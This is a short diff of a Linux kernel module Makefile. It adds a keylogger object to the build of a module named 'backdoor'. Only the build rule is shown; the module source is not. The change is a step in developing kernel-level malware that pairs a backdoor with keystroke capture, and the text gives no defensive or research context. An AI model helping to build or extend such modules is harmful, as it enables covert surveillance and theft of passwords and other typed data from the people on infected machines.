@@ -1,2 +1,2 @@
 obj-m := backdoor.o
-backdoor-y = module_main.o
+backdoor-y = module_main.o keylogger.o
